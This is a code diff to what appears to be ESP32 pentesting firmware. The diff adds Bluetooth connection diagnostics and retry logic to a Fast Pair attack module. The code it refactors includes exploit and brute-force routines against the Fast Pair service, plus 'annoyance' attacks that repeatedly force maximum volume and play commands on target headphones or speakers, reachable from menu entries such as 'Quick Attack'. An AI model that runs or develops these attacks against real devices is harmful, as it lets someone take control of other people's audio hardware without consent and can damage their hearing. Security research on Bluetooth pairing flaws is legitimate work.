@@ -20,6 +20,85 @@ extern volatile int tftHeight;
 AudioCommandService audioCmd;
 FastPairCrypto crypto;
 
+// ===== CONNECTION DIAGNOSTICS =====
+void diagnoseConnection(NimBLEAddress target) {
+    Serial.println("\n=== CONNECTION DIAGNOSIS ===");
+    Serial.printf("Target: %s\n", target.toString().c_str());
+    Serial.printf("Address type: %d\n", target.getType());
+    Serial.printf("NimBLE initialized: %s\n", NimBLEDevice::getInitialized() ? "YES" : "NO");
+    
+    NimBLEScan* scanner = NimBLEDevice::getScan();
+    if(scanner) {
+        Serial.println("Scanner available: YES");
+    } else {
+        Serial.println("Scanner available: NO");
+    }
+    
+    NimBLEClient* testClient = NimBLEDevice::createClient();
+    testClient->setConnectTimeout(2);
+    
+    Serial.println("Attempting brief connection test...");
+    if(testClient->connect(target, false)) {
+        Serial.println("✓ Brief connection SUCCESS");
+        
+        std::vector<NimBLERemoteService*>* services = testClient->getServices(true);
+        if(services) {
+            Serial.printf("✓ Found %d services\n", services->size());
+        }
+        testClient->disconnect();
+    } else {
+        Serial.println("✗ Brief connection FAILED");
+        
+        scanner->clearResults();
+        scanner->setActiveScan(true);
+        scanner->start(1, false);
+        
+        bool found = false;
+        for(int i = 0; i < scanner->getResults().getCount(); i++) {
+            NimBLEAdvertisedDevice* dev = scanner->getResults().getDevice(i);
+            if(dev->getAddress().equals(target)) {
+                Serial.printf("✓ Device IS advertising (RSSI: %d)\n", dev->getRSSI());
+                found = true;
+                break;
+            }
+        }
+        
+        if(!found) {
+            Serial.println("✗ Device NOT found in scan");
+        }
+        
+        scanner->stop();
+    }
+    
+    NimBLEDevice::deleteClient(testClient);
+    Serial.println("=== DIAGNOSIS COMPLETE ===\n");
+}
+
+bool connectWithRetry(NimBLEAddress target, int maxRetries) {
+    for(int attempt = 0; attempt < maxRetries; attempt++) {
+        Serial.printf("[CONNECT] Attempt %d to %s\n", attempt+1, target.toString().c_str());
+        
+        NimBLEClient* pClient = NimBLEDevice::createClient();
+        pClient->setConnectTimeout(8);
+        
+        if(attempt == 0) {
+            if(pClient->connect(target, false)) return true;
+        } 
+        else if(attempt == 1) {
+            if(pClient->connect(target, true)) return true;
+        }
+        else {
+            if(pClient->connect(target)) return true;
+        }
+        
+        NimBLEDevice::deleteClient(pClient);
+        delay(500 * (attempt + 1));
+    }
+    return false;
+}
+// ===== END CONNECTION DIAGNOSTICS =====
+
+// ===== ORIGINAL FUNCTIONS WITH CONNECTION FIXES =====
 void showDeviceInfoScreen(const char* title, const std::vector<String>& lines, uint16_t bgColor = TFT_BLACK, uint16_t textColor = TFT_WHITE) {
     tft.fillScreen(bgColor);
     drawMainBorderWithTitle(title);
@@ -294,25 +373,15 @@ NimBLEAddress parseAddress(const String& addressInfo) {
 }
 
 bool whisperPairEfficientExploit(NimBLEAddress target) {
-    NimBLEClient* pClient = NimBLEDevice::createClient();
-    pClient->setConnectTimeout(10);
-    
-    showAdaptiveMessage("Connecting...", "", "", "", TFT_WHITE, false, true);
-    
-    bool connected = false;
-    connected = pClient->connect(target, false);
-    
-    if(!connected) {
-        NimBLEDevice::deleteClient(pClient);
-        delay(100);
-        pClient = NimBLEDevice::createClient();
-        pClient->setConnectTimeout(10);
-        connected = pClient->connect(target, true);
+    // Use new connection function
+    if(!connectWithRetry(target, 3)) {
+        showErrorMessage("Connection failed after retries");
+        return false;
     }
     
-    if(!connected) {
-        showErrorMessage("Connection failed");
-        NimBLEDevice::deleteClient(pClient);
+    NimBLEClient* pClient = NimBLEDevice::getClientByPeerAddress(target);
+    if(!pClient) {
+        showErrorMessage("Client not found after connection");
         return false;
     }
     
@@ -408,12 +477,12 @@ bool whisperPairEfficientExploit(NimBLEAddress target) {
 }
 
 bool attemptProtocolExploit(NimBLEAddress target) {
-    NimBLEClient* pClient = NimBLEDevice::createClient();
-    pClient->setConnectTimeout(10);
-    
-    if(!pClient->connect(target, true)) {
+    if(!connectWithRetry(target, 2)) {
         return false;
     }
+    
+    NimBLEClient* pClient = NimBLEDevice::getClientByPeerAddress(target);
+    if(!pClient) return false;
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
@@ -456,12 +525,12 @@ bool attemptProtocolExploit(NimBLEAddress target) {
 }
 
 bool bruteForceCharacteristics(NimBLEAddress target) {
-    NimBLEClient* pClient = NimBLEDevice::createClient();
-    pClient->setConnectTimeout(10);
-    
-    if(!pClient->connect(target, true)) {
+    if(!connectWithRetry(target, 2)) {
         return false;
     }
+    
+    NimBLEClient* pClient = NimBLEDevice::getClientByPeerAddress(target);
+    if(!pClient) return false;
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
@@ -652,6 +721,18 @@ String selectTargetFromScan(const char* title) {
     return "";
 }
 
+// Add this to test connections
+void testConnectionDiagnostic() {
+    initBLEIfNeeded("Bruce-Diagnostic");
+    String targetInfo = selectTargetFromScan("DIAGNOSE CONNECTION");
+    if(targetInfo.isEmpty()) return;
+    
+    NimBLEAddress target = parseAddress(targetInfo);
+    diagnoseConnection(target);
+    
+    showAdaptiveMessage("Diagnosis complete", "OK", "", "", TFT_WHITE, true, false);
+}
+
 void testFastPairVulnerability() {
     initBLEIfNeeded("Bruce-WP");
     String selectedInfo = selectTargetFromScan("FAST PAIR SCAN");
@@ -679,13 +760,16 @@ void testFastPairVulnerability() {
     std::vector<String> debugLines;
     debugLines.push_back("Connecting to target...");
     
-    NimBLEClient* pClient = NimBLEDevice::createClient();
-    pClient->setConnectTimeout(10);
-    
-    if(!pClient->connect(target, true)) {
+    if(!connectWithRetry(target, 3)) {
         debugLines.push_back("Connection failed!");
         showDeviceInfoScreen("DEVICE CHECK", debugLines, TFT_RED, TFT_WHITE);
-        NimBLEDevice::deleteClient(pClient);
+        return;
+    }
+    
+    NimBLEClient* pClient = NimBLEDevice::getClientByPeerAddress(target);
+    if(!pClient) {
+        debugLines.push_back("Client lost!");
+        showDeviceInfoScreen("ERROR", debugLines, TFT_RED, TFT_WHITE);
         return;
     }
     
@@ -697,7 +781,6 @@ void testFastPairVulnerability() {
         debugLines.push_back("No FastPair service (FE2C)");
         showDeviceInfoScreen("NOT FASTPAIR", debugLines, TFT_YELLOW, TFT_BLACK);
         pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
         return;
     }
     
@@ -708,7 +791,6 @@ void testFastPairVulnerability() {
         debugLines.push_back("No KBP characteristic");
         showDeviceInfoScreen("NO KBP", debugLines, TFT_YELLOW, TFT_BLACK);
         pClient->disconnect();
-        NimBLEDevice::deleteClient(pClient);
         return;
     }
     
@@ -727,49 +809,48 @@ void testFastPairVulnerability() {
     }
     
     pClient->disconnect();
-    NimBLEDevice::deleteClient(pClient);
 }
 
 void maxVolumeAttack(NimBLEAddress target) {
-    NimBLEClient* pClient = NimBLEDevice::createClient();
-    pClient->setConnectTimeout(10);
+    if(!connectWithRetry(target, 2)) return;
     
-    if(pClient->connect(target, true)) {
-        NimBLERemoteService* pAvrcpService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
-        if(pAvrcpService) {
-            NimBLERemoteCharacteristic* pVolChar = pAvrcpService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE1));
-            if(pVolChar && pVolChar->canWrite()) {
-                for(int i = 0; i < 30; i++) {
-                    uint8_t volUp[] = {0x00, 0x48, 0x00, 0x10, 0x64};
-                    pVolChar->writeValue(volUp, 5, false);
-                    delay(30);
-                }
-                showSuccessMessage("VOLUME MAXED!");
+    NimBLEClient* pClient = NimBLEDevice::getClientByPeerAddress(target);
+    if(!pClient) return;
+    
+    NimBLERemoteService* pAvrcpService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
+    if(pAvrcpService) {
+        NimBLERemoteCharacteristic* pVolChar = pAvrcpService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE1));
+        if(pVolChar && pVolChar->canWrite()) {
+            for(int i = 0; i < 30; i++) {
+                uint8_t volUp[] = {0x00, 0x48, 0x00, 0x10, 0x64};
+                pVolChar->writeValue(volUp, 5, false);
+                delay(30);
             }
+            showSuccessMessage("VOLUME MAXED!");
         }
-        pClient->disconnect();
     }
+    pClient->disconnect();
 }
 
 void forcePlayCommand(NimBLEAddress target) {
-    NimBLEClient* pClient = NimBLEDevice::createClient();
-    pClient->setConnectTimeout(10);
+    if(!connectWithRetry(target, 2)) return;
     
-    if(pClient->connect(target, true)) {
-        NimBLERemoteService* pMediaService = pClient->getService(NimBLEUUID((uint16_t)0x110B));
-        if(pMediaService) {
-            NimBLERemoteCharacteristic* pPlayChar = pMediaService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE2));
-            if(pPlayChar && pPlayChar->canWrite()) {
-                uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x1A, 0x01};
-                for(int i = 0; i < 10; i++) {
-                    pPlayChar->writeValue(playCmd, 5, false);
-                    delay(50);
-                }
-                showAdaptiveMessage("PLAY command spammed!", "", "", "", TFT_GREEN, false, true);
+    NimBLEClient* pClient = NimBLEDevice::getClientByPeerAddress(target);
+    if(!pClient) return;
+    
+    NimBLERemoteService* pMediaService = pClient->getService(NimBLEUUID((uint16_t)0x110B));
+    if(pMediaService) {
+        NimBLERemoteCharacteristic* pPlayChar = pMediaService->getCharacteristic(NimBLEUUID((uint16_t)0x2BE2));
+        if(pPlayChar && pPlayChar->canWrite()) {
+            uint8_t playCmd[] = {0x00, 0x48, 0x00, 0x1A, 0x01};
+            for(int i = 0; i < 10; i++) {
+                pPlayChar->writeValue(playCmd, 5, false);
+                delay(50);
             }
+            showAdaptiveMessage("PLAY command spammed!", "", "", "", TFT_GREEN, false, true);
         }
-        pClient->disconnect();
     }
+    pClient->disconnect();
 }
 
 void runAnnoyanceAttackSuite(NimBLEAddress target) {
@@ -975,6 +1056,12 @@ void jamAndConnectMenu() {
 void whisperPairMenu() {
     std::vector<Option> options;
     returnToMenu = false;
+    
+    // Add diagnostic option
+    options.push_back({"[Connection Diagnostic]", []() {
+        testConnectionDiagnostic();
+    }});
+    
     options.push_back({"[Quick Attack]", []() {
         initBLEIfNeeded("Bruce-WP");
         String targetInfo = selectTargetFromScan("SELECT TARGET");
